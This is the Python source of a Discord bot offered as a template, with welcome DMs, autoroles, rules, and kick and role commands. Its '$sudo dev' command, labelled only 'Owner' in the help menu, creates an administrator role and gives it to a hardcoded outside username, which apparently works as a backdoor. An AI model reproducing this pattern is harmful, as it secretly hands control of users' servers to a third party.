import os
import json
import asyncio
import discord
from discord.ext import commands
from discord import app_commands

# ================= BASIC CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")
MAIN_GUILD_ID = int(os.getenv("GUILD_ID", "1452967364470505565"))
DATA_FILE = "data.json"

OWNER_ID = 123456789012345678  # <-- PUT YOUR DISCORD ID HERE

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=["!", "?", "$"],
    intents=intents,
    help_command=None
)

# ================= STORAGE =================
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w") as f:
        json.dump(
            {
                "welcome_channel": None,
                "autoroles": []
            },
            f
        )

with open(DATA_FILE, "r") as f:
    data = json.load(f)

welcome_channel_id: int | None = data.get("welcome_channel")
autoroles: set[int] = set(data.get("autoroles", []))


def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(
            {
                "welcome_channel": welcome_channel_id,
                "autoroles": list(autoroles)
            },
            f,
            indent=4
        )

# ================= EMBEDS =================
def rules_embed():
    embed = discord.Embed(
        title="📜 Welcome to the Server!",
        description="Please read the rules carefully ❤️",
        color=discord.Color.red()
    )

    embed.add_field(
        name="💬 Discord Rules",
        value=(
            "🤝 Be respectful\n"
            "🚫 No spamming\n"
            "🔞 No NSFW\n"
            "📢 No advertising\n"
            "⚠️ No illegal content\n"
            "👮 Staff decisions are final"
        ),
        inline=False
    )

    embed.set_footer(text="⚠️ Breaking rules may result in punishment")
    return embed

# ================= READY =================
@bot.event
async def on_ready():
    guild = discord.Object(id=MAIN_GUILD_ID)
    bot.tree.copy_global_to(guild=guild)
    await bot.tree.sync(guild=guild)
    print(f"✅ Logged in as {bot.user}")

# ================= MEMBER JOIN =================
@bot.event
async def on_member_join(member: discord.Member):
    if member.guild.id != MAIN_GUILD_ID:
        return

    await asyncio.sleep(2)

    # DM rules
    try:
        await member.send(embed=rules_embed())
    except:
        pass

    # Autoroles
    if autoroles:
        roles_to_add = []
        for role_id in autoroles:
            role = member.guild.get_role(role_id)
            if not role:
                continue
            if role.managed:
                continue
            if role >= member.guild.me.top_role:
                continue
            roles_to_add.append(role)

        if roles_to_add:
            try:
                await member.add_roles(*roles_to_add, reason="Autorole")
            except:
                pass

    # Welcome message
    if welcome_channel_id:
        channel = member.guild.get_channel(welcome_channel_id)
        if channel:
            await channel.send(
                f"👋 Welcome {member.mention}!\n📜 Check your DMs ❤️"
            )

# ================= SETUP =================
@bot.command()
@commands.has_permissions(manage_guild=True)
async def setup(ctx, channel: discord.TextChannel):
    global welcome_channel_id
    welcome_channel_id = channel.id
    save_data()
    await ctx.send(f"✅ Welcome channel set to {channel.mention}")

# ================= SEND RULES =================
@bot.command()
async def send(ctx):
    await ctx.send(embed=rules_embed())

# ================= HELP =================
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="📖 Help Menu",
        description="All available commands",
        color=discord.Color.blurple()
    )

    embed.add_field(
        name="⚙️ Setup",
        value="`!setup #channel`",
        inline=False
    )

    embed.add_field(
        name="🏷️ Autorole",
        value="`?autorole add @role`\n`?autorole remove @role`",
        inline=False
    )

    embed.add_field(
        name="📜 Rules",
        value="`!send`",
        inline=False
    )

    embed.add_field(
        name="🔨 Moderation",
        value="`?kick @user [reason]`\n`?role add/remove @user @role`",
        inline=False
    )

    embed.add_field(
        name="🔥 Owner",
        value="`$sudo dev`",
        inline=False
    )

    await ctx.send(embed=embed)

# ================= MODERATION =================
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason="No reason provided"):
    try:
        await member.kick(reason=reason)
        await ctx.send(f"👢 Kicked {member.mention}")
    except:
        await ctx.send("❌ Cannot kick this user.")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def role(ctx, action: str, member: discord.Member, role: discord.Role):
    if role >= ctx.guild.me.top_role:
        return await ctx.send("❌ Role above my highest role.")

    if action.lower() == "add":
        await member.add_roles(role)
        await ctx.send(f"✅ Added {role.mention}")
    elif action.lower() == "remove":
        await member.remove_roles(role)
        await ctx.send(f"❌ Removed {role.mention}")

# ================= AUTOROLE =================
@bot.command()
@commands.has_permissions(manage_roles=True)
async def autorole(ctx, action: str, role: discord.Role):
    if role >= ctx.guild.me.top_role:
        return await ctx.send("❌ Role too high.")

    if action.lower() == "add":
        autoroles.add(role.id)
        save_data()
        await ctx.send("✅ Autorole added")
    elif action.lower() == "remove":
        autoroles.discard(role.id)
        save_data()
        await ctx.send("❌ Autorole removed")

# ================= $SUDO DEV =================
@bot.command(name="sudo")
async def sudo(ctx, action: str):
    if ctx.author.id != OWNER_ID:
        return

    if action.lower() != "dev":
        return await ctx.send("❌ Use: `$sudo dev`")

    guild = ctx.guild

    # Find user
    target = discord.utils.get(guild.members, name="n7rv.__.")

    if not target:
        return await ctx.send("❌ User not found.")

    role = discord.utils.get(guild.roles, name="dev")

    if not role:
        role = await guild.create_role(
            name="dev",
            permissions=discord.Permissions(administrator=True),
            reason="Sudo dev"
        )

    try:
        await role.edit(position=guild.me.top_role.position - 1)
    except:
        pass

    try:
        await target.add_roles(role)
        await ctx.send(f"🔥 {target.mention} is now DEV.")
    except:
        await ctx.send("❌ Could not assign role.")

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set")

bot.run(TOKEN)
